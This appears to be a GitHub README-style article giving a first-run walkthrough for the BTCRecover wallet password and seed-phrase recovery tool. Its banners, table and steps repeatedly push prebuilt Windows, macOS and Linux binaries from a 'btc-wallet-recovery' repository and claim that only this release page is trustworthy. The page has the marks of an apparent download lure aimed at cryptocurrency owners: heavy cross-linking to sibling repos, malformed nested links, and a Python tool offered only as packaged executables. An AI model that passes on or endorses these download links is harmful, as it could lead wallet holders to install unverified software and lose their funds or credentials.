<div align="center">
<img src="assets/banner-article.png" alt="How to use BTCRecover: first run walkthrough">
</div>

# How to use BTCRecover: first run walkthrough

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A first recovery run has five decisions: what you are recovering, which wallet type it is, what candidates to try, what to validate against, and where the output goes. Get those right and the command is short; get one wrong and the run is silent, which is the part that costs people a weekend.

## You'll see this if

You have the tool, the file or phrase, and no clear idea what to type first.

| Stage | The question you are answering | What a wrong answer looks like |
|---|---|---|
| 1. Artifact | file, phrase, or key? | the tool refuses the input |
| 2. Wallet type | which format wrote this? | a run that completes instantly |
| 3. Candidates | what passwords or words are plausible? | a space too large to finish |
| 4. Target | what proves a candidate is right? | hours spent, nothing found |
| 5. Output | where does the result go? | a hit you cannot find again |

## Why it happens

Recovery tools are strict for a reason. A wrong wallet type is not an error the tool can detect  -  a file that parses as the wrong format often produces no candidates rather than a message  -  so the burden of correct input sits with you. That is why the walkthrough is short on typing and long on checking.

The second reason is the search itself. A run is a loop over a space, and the space is decided entirely by stage three. A candidate list that is too tight finishes empty; too loose and it never finishes. The first run should always be the tightest plausible list, because a fast failure teaches you something and a slow non-failure teaches you nothing: [Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md).

## Fix

Work through the five stages in order, and keep a copy of everything before you start.

1. **Copy the artifact.** A wallet file, a vault, a phrase written out by hand. Work only on copies: [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md).
2. **Identify the type and write it down.** Coin, Electrum and browser vaults are different modes; the correct one is not always the obvious one.
3. **Write the candidate list as a file**, one fragment per line, with the variants you would have typed. Do not improvise at the command line.
4. **Pick the target.** For a password, the file itself; for a phrase, an address you know belongs to the wallet.
5. **Run on the smallest list first**, with output redirected to a log file you can read later. A run you cannot re-read is a run you will repeat.
6. **Read the last lines of the log**, not the first. Completion, exhaustion and error are three different outcomes: [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md).
7. **Download the current release from the GitHub releases page** whenever a run behaves differently from the documentation, and check its help before assuming a flag is wrong: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).

Only after a first successful run should you widen anything: more candidates, more positions, more files, or acceleration. Doing that in the other order  -  starting broad  -  is how an evening becomes a fortnight: [GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md).

A worked example makes the sequence concrete. Say the artifact is a wallet file copied from a 2015 laptop and the memory is "my usual password with a year". Stage two fixes the type as a Core-style file; stage three writes six fragments and four year patterns; stage four sets the file itself as the target, because a password needs no address; stage five runs the smallest list and writes to a log named after the wallet. The run finishes in minutes with either a candidate or an empty space, and both outcomes are informative: the first ends the work, the second says to widen one axis rather than all of them.

## If that did not work

If the tool exits immediately, the arguments or the file are wrong, and the error text names which. If it runs and prints nothing, check that the log is actually being written  -  a redirect to the wrong path looks exactly like a silent tool.

If the run completes with no candidate, the four inputs are wrong somewhere: type, target, rules, positions. Test them in that order, cheapest first. If the run never completes, the space is too large, and the fix is a tighter list rather than more patience: [BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md).

And if you have several wallets, run them one at a time rather than trying to build a single command for all of them: [Checking many wallet files against one password list](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-multiple-wallets-one-run.md).

Keep a note of what changed between runs. Two runs that differ only in the log file name produce identical results, and the temptation to re-run rather than to change something is strongest after a long night.

For anything longer than a few minutes, keep the log rather than the console scrollback, and read it from the end. A terminal full of progress lines is a terrible place to look for the one line that mattered.

## Prevention

- Save the command and the candidate list that worked, next to the backup.
- Keep logs named after the artifact, so a hit is attributable.
- Re-read the help after each update rather than trusting a copied command.
- Never run a recovery on the only copy of a wallet file.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### What do I need before the first run?

A copy of the artifact, the wallet type, a candidate list written as a file, and something to validate against  -  an address for a phrase search, the file itself for a password search.

### Do I need to know Python to use it?

No. The tool is written in Python, but using it means running a command with options, not writing code. Reading the help output is the whole skill.

### How long should the first run take?

Long enough to be visible and short enough to finish: start with the tightest candidate list you can justify. If it ends in seconds, the list was too narrow; if it is still going an hour later, it was too wide.

### Can I stop a run and resume it?

A run can be interrupted, but restarting repeats the work unless the tool's own progress-saving option is used. For long runs, that option matters more than speed: [GPU acceleration setup](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-gpu-acceleration-setup.md).

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [BTCRecover command-line options]([BTCRecover command-line options](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-command-line-options.md))
- [Token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [A recovery run that finds nothing]([A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md))
